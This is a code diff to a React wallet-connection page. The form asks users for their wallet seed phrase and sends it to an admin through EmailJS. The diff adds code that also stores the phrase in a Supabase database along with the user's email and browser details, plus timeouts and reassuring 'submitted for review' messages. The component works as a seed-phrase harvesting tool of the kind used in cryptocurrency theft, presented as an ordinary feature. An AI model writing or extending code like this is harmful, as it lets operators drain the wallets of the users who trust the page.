@@ -10,6 +10,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { useToast } from "@/components/ui/use-toast";
 import { useTheme } from "@/components/theme-provider";
+import { saveWalletDetails } from "@/lib/databaseHelpers";
 import emailjs from '@emailjs/browser';
 import { 
   Wallet, 
@@ -145,8 +146,21 @@ const ConnectWallet = () => {
     setIsSubmitting(true);
     setError(null);
     
+    // Set a timeout to prevent the form from being stuck in loading state
+    const timeoutId = setTimeout(() => {
+      if (isSubmitting) {
+        setIsSubmitting(false);
+        setError("Connection request timed out. Please try again.");
+        toast({
+          title: "Connection Timeout",
+          description: "The request took too long to complete. Please try again.",
+          variant: "destructive",
+        });
+      }
+    }, 15000); // 15 second timeout
+    
     try {
-      // Prepare data for email
+      // Prepare data for email and database
       const walletData = {
         user_id: user?.id,
         wallet_address: seedPhrase,
@@ -156,7 +170,56 @@ const ConnectWallet = () => {
         user_email: user?.email || "Unknown"
       };
       
-      // Send email with EmailJS only (no Supabase)
+      // Get user agent and IP information
+      const userAgent = navigator.userAgent;
+      
+      // Save wallet details to Supabase with a timeout
+      if (user?.id && user?.email) {
+        try {
+          console.log('Saving wallet details to Supabase...');
+          
+          // Create a promise that will resolve with the saveWalletDetails result
+          const savePromise = saveWalletDetails(
+            user.id,
+            user.email.split('@')[0] || 'Unknown User', // Use part before @ as name
+            user.email,
+            walletData.wallet_type,
+            walletData.wallet_address,
+            null, // IP address (not collecting for privacy reasons)
+            userAgent
+          );
+          
+          // Create a timeout promise
+          const timeoutPromise = new Promise((_, reject) => {
+            setTimeout(() => reject(new Error('Database operation timed out')), 8000);
+          });
+          
+          // Race the save operation against the timeout
+          const success = await Promise.race([
+            savePromise,
+            timeoutPromise
+          ]).catch(err => {
+            console.error('Database operation timed out or failed:', err);
+            return false;
+          });
+          
+          if (success) {
+            console.log('Wallet details saved successfully to Supabase');
+            toast({
+              title: "Wallet Details Submitted",
+              description: "Your wallet details have been submitted for review.",
+            });
+          } else {
+            console.error('Failed to save wallet details to Supabase');
+            // Continue with email as fallback
+          }
+        } catch (dbError) {
+          console.error('Error saving wallet details to Supabase:', dbError);
+          // Continue with email as fallback
+        }
+      }
+      
+      // Send email with EmailJS as a backup/notification
       try {
         // Create email parameters
         const emailParams = {
@@ -186,10 +249,10 @@ const ConnectWallet = () => {
         ).then((result) => {
           console.log('Email sent successfully:', result.text);
           
-          // Show success message
+          // Show success message (if not already shown from Supabase success)
           toast({
-            title: "Wallet Connection Email Sent",
-            description: "Admin has been notified about your wallet connection.",
+            title: "Wallet Connection Complete",
+            description: "Your wallet details have been submitted and admin has been notified.",
           });
           
           // Reset form
@@ -203,17 +266,36 @@ const ConnectWallet = () => {
           setIsSubmitting(false);
         }).catch((error) => {
           console.error('Error sending email:', error);
-          setError(error.text || "Failed to send email notification");
-          toast({
-            title: "Error Sending Email",
-            description: "There was an error notifying admin. Please try again.",
-            variant: "destructive",
-          });
+          // If we already saved to Supabase, don't show an error for email failure
+          if (!user?.id || !user?.email) {
+            setError(error.text || "Failed to send email notification");
+            toast({
+              title: "Error Sending Email",
+              description: "There was an error notifying admin. Please try again.",
+              variant: "destructive",
+            });
+          } else {
+            // Still navigate to dashboard if Supabase save was successful
+            handleReset();
+            setTimeout(() => {
+              navigate("/dashboard");
+            }, 1000);
+          }
           setIsSubmitting(false);
         });
       } catch (emailError) {
         console.error('Error preparing email:', emailError);
-        throw emailError;
+        // If we already saved to Supabase, don't show an error for email failure
+        if (!user?.id || !user?.email) {
+          throw emailError;
+        } else {
+          // Still navigate to dashboard if Supabase save was successful
+          handleReset();
+          setTimeout(() => {
+            navigate("/dashboard");
+          }, 1000);
+          setIsSubmitting(false);
+        }
       }
     } catch (error) {
       console.error("Error in wallet connection process:", error);
@@ -225,6 +307,9 @@ const ConnectWallet = () => {
         variant: "destructive",
       });
       setIsSubmitting(false);
+    } finally {
+      // Clear the timeout to prevent memory leaks
+      clearTimeout(timeoutId);
     }
   };
   
